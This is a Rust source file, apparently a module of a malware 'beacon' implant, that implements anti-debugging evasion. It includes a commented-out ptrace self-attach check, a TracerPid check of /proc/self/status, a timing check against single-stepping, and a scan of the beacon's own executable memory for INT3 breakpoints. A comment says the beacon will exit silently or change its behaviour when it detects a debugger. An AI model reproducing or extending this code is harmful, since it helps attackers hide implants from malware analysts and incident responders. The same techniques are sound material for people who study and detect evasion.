use crate::sys;

/// Run all anti-debug checks. Returns true if a debugger is detected.
/// In production, the beacon will exit silently or alter behavior
/// like sleeping for an extended time rather than announcing detection.
pub fn check() -> bool {
    /*
    if ptrace_check() {
        crate::dbg_log!("anti-debug: ptrace detected");
        return true;
    }
    */
    if tracer_pid_check() {
        crate::dbg_log!("anti-debug: TracerPid detected");
        return true;
    }

    if timing_check() {
        crate::dbg_log!("anti-debug: timing anomaly detected");
        return true;
    }

    false
}

/*
fn ptrace_check() -> bool {
    unsafe {
        let pid = libc::fork();
        if pid == 0 {
            // Child: try to attach to parent
            let ppid = libc::getppid();
            let ret = libc::syscall(
                libc::SYS_ptrace,
                16i64,  // PTRACE_ATTACH
                ppid as i64,
                0i64,
                0i64,
            );
            if ret < 0 {
                // Can't attach - parent is being traced
                libc::_exit(1);
            }
            // Wait for parent to stop (ATTACH sends SIGSTOP)
            let mut status: i32 = 0;
            libc::waitpid(ppid, &mut status, 0);
            
            // Continue the parent
            libc::syscall(
                libc::SYS_ptrace,
                7i64,   // PTRACE_CONT
                ppid as i64,
                0i64,
                0i64,
            );
            
            // Now detach cleanly
            libc::syscall(
                libc::SYS_ptrace,
                17i64,  // PTRACE_DETACH
                ppid as i64,
                0i64,
                0i64,
            );
            libc::_exit(0);
        } else if pid > 0 {
            // Parent: wait for child to finish its check
            let mut status: i32 = 0;
            libc::waitpid(pid, &mut status, 0);
            return libc::WEXITSTATUS(status) == 1;
        }
    }
    false
}
*/
/// Read /proc/self/status and check TracerPid field.
/// Non-zero means a debugger is attached.
fn tracer_pid_check() -> bool {
    if let Ok(status) = sys::read_file_string("/proc/self/status") {
        for line in status.lines() {
            if line.starts_with("TracerPid:") {
                let pid_str = line.split(':').nth(1).unwrap_or("0").trim();
                if let Ok(pid) = pid_str.parse::<u32>() {
                    return pid != 0;
                }
            }
        }
    }
    false
}

/// Timing check - measure a known-fast operation.
/// If it takes too long, we're being single-stepped.
fn timing_check() -> bool {
    let start = std::time::Instant::now();

    // Do some work that should complete in microseconds
    let mut x: u64 = 0;
    for i in 0..10000u64 {
        x = x.wrapping_mul(6364136223846793005).wrapping_add(i);
    }

    // Prevent optimization from removing the loop
    std::hint::black_box(x);

    let elapsed = start.elapsed();

    // 10,000 iterations of simple math should take < 1ms
    // Under a debugger stepping through, it takes seconds
    elapsed.as_millis() > 50
}

/// Scan our own .text section for INT3 (0xCC) breakpoints.
/// Returns true if any are found where they shouldn't be.
pub fn breakpoint_scan() -> bool {
    // Read /proc/self/maps to find our .text section
    if let Ok(maps) = sys::read_file_string("/proc/self/maps") {
        for line in maps.lines() {
            // Look for executable mappings of our own binary
            if line.contains("r-xp") && line.contains("beacon") {
                if let Some(range) = parse_map_range(line) {
                    let (start, end) = range;
                    let text = unsafe {
                        std::slice::from_raw_parts(start as *const u8, end - start)
                    };

                    // Count INT3 instructions (0xCC)
                    // Some legitimate 0xCC bytes exist in code, but clusters
                    // of them or 0xCC at function boundaries suggest breakpoints
                    let mut consecutive_cc = 0;
                    for &byte in text {
                        if byte == 0xCC {
                            consecutive_cc += 1;
                            if consecutive_cc >= 2 {
                                return true;
                            }
                        } else {
                            consecutive_cc = 0;
                        }
                    }
                }
            }
        }
    }
    false
}

fn parse_map_range(line: &str) -> Option<(usize, usize)> {
    let range = line.split_whitespace().next()?;
    let mut parts = range.split('-');
    let start = usize::from_str_radix(parts.next()?, 16).ok()?;
    let end = usize::from_str_radix(parts.next()?, 16).ok()?;
    Some((start, end))
}